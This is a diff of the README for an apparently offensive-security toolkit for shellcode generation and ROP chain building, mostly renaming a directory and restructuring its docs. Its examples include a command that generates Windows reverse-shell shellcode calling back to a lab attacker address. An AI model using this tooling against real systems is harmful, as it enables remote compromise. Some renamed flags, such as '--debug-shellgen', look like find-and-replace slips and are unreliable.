@@ -8,14 +8,14 @@ A comprehensive collection of Python-based security testing tools for exploit de
 
 ## 🛠️ Tools Overview
 
-### 1. 🐚 [Shellcode Generator](shellcode/)
+### 1. 🐚 [Shellcode Generator](shellgen/)
 **Multi-architecture shellcode generation with automatic bad character avoidance**
 
 Generate position-independent shellcode for Windows (x86/x64) and Linux (ARM/ARM64) with automatic bad character encoding, ROP13 hash-based API resolution, and multiple output formats.
 
 ```bash
 # Windows x64 reverse shell
-cd shellcode && ./shellgen.sh --platform windows --payload reverse_shell \
+cd shellgen && ./shellgen.sh --platform windows --payload reverse_shell \
   --host 10.10.14.5 --port 443 --arch x64
 
 # Linux ARM64 command execution
@@ -30,7 +30,7 @@ cd shellcode && ./shellgen.sh --platform windows --payload reverse_shell \
 - ✅ Python, C, ASM, raw binary output
 - ✅ Shellcode verification and debugging
 
-**[📖 Full Documentation →](shellcode/README.md)**
+**[📖 Full Documentation →](shellgen/README.md)**
 
 ---
 
@@ -97,21 +97,17 @@ Shared Python modules providing consistent functionality across the entire toolk
 ```bash
 # Clone the repository
 git clone <your-repo-url>
-cd pentest-tools
+cd rop_tools
 
-# Install dependencies for all tools
-pip install -r shellcode/requirements.txt
-pip install -r rop/requirements.txt
-
-# Or install globally
-pip install rich pefile keystone-engine capstone
+# Install all dependencies
+pip install -r requirements.txt
 ```
 
 ### Basic Usage Examples
 
 #### Generate Windows Shellcode
 ```bash
-cd shellcode
+cd shellgen
 ./shellgen.sh --platform windows --payload messagebox \
   --title "Test" --message "Hello!" --arch x86
 ```
@@ -129,7 +125,7 @@ cd rop
 ./rop_worksheet.py
 > importregs    # Import from WinDbg
 > importstack   # Import stack dump
-> name shellcode 0x00501000
+> name shellgen 0x00501000
 > chain 0x10001234 "pop eax ; ret" "Load shellcode addr"
 ```
 
@@ -138,19 +134,24 @@ cd rop
 ## 📦 Project Structure
 
 ```
-pentest-tools/
+rop_tools/
 ├── README.md                 # This file
+├── requirements.txt          # All dependencies
 ├── LICENSE
 ├── .gitignore
+├── docs/                     # Documentation
+│   ├── README.md             # Documentation index
+│   └── bad_character_avoidance.md  # Shellcode encoding techniques
+│
 ├── lib/                      # Shared libraries
 │   ├── __init__.py
-│   └── color_printer.py      # Terminal color abstraction
+│   ├── color_printer.py      # Terminal color abstraction
+│   └── tests/                # Lib tests
 │
-├── shellcode/                # Shellcode generator
+├── shellgen/                 # Shellcode generator
 │   ├── README.md             # Shellcode documentation
 │   ├── CLAUDE.md             # Technical details
-│   ├── MODULAR_STRUCTURE.md  # Architecture docs
-│   ├── shellgen/             # Main package
+│   ├── src/                  # Core package modules
 │   │   ├── encoders.py       # Bad character encoding
 │   │   ├── assembler.py      # Keystone integration
 │   │   ├── formatters.py     # Output formats
@@ -162,7 +163,7 @@ pentest-tools/
 │   ├── shellgen_cli.py       # Main entry point
 │   ├── shellgen.sh           # Wrapper script
 │   ├── hash_generator.py     # ROR13 hash tool
-│   └── requirements.txt
+│   └── tests/                # Test suite
 │
 ├── rop/                      # ROP tools suite
 │   ├── README.md             # ROP tools documentation
@@ -174,11 +175,11 @@ pentest-tools/
 │   │   └── pe_info.py        # PE analysis
 │   ├── display/              # Output formatting
 │   │   └── formatters.py
+│   ├── worksheet/            # Interactive worksheet modules
 │   ├── get_rop_gadgets.py    # Gadget analyzer
 │   ├── get_base_address.py   # PE base extractor
 │   ├── rop_worksheet.py      # Interactive worksheet
-│   ├── tests/                # Test suite
-│   └── requirements.txt
+│   └── tests/                # Test suite
 │
 └── code_snippets/            # Utility scripts
     ├── rop_encoder_decoder.py
@@ -241,7 +242,7 @@ pip install rich           # Colored terminal output (optional but recommended)
 #### Shellcode Generator
 ```bash
 pip install keystone-engine    # Assembly
-pip install capstone           # Disassembly (for --debug-shellcode)
+pip install capstone           # Disassembly (for --debug-shellgen)
 ```
 
 #### ROP Tools
@@ -258,10 +259,13 @@ pip install rich           # ROP worksheet colored output
 
 ## 📖 Documentation
 
-Each tool has detailed documentation in its respective directory:
+### General Documentation
+- **[Documentation Index](docs/)** - Comprehensive documentation hub
+- **[Bad Character Avoidance Techniques](docs/bad_character_avoidance.md)** - 20+ instruction-level encoding techniques
 
-- **[Shellcode Generator](shellcode/README.md)** - Full usage guide, examples, API reference
-- **[Shellcode Technical Details](shellcode/CLAUDE.md)** - Implementation details, architecture
+### Tool-Specific Documentation
+- **[Shellcode Generator](shellgen/README.md)** - Full usage guide, examples, API reference
+- **[Shellcode Technical Details](shellgen/CLAUDE.md)** - Implementation details, architecture
 - **[ROP Tools Suite](rop/README.md)** - Complete tool documentation
 - **[ROP Development Notes](rop/CLAUDE.md)** - Feature history, technical notes
 
